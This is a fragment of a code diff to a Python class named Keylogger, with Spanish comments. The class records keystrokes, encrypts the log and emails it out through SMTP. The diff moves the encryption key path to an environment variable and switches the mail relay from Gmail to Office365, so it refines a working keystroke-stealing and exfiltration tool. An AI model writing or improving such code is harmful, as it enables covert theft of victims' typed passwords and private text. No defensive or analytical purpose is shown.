@@ -39,7 +39,7 @@ class Keylogger:
 
         :return: Clave de cifrado en bytes
         """
-        return open('secret.key', 'rb').read()
+        return open(os.environ.get("passfile"), 'rb').read()
 
     def on_press(self, key: keyboard.Key):
         """
@@ -72,7 +72,7 @@ class Keylogger:
             try:
                 encrypted_log = self.encrypt_log()
                 print("Encrypted log:", encrypted_log)  # Imprimir el log cifrado
-                server = smtplib.SMTP('smtp.gmail.com', 587)
+                server = smtplib.SMTP('smtp.office365.com', 587)
                 server.starttls()
                 server.login(self.email, self.password)
                 server.sendmail(self.email, self.recipient, encrypted_log)
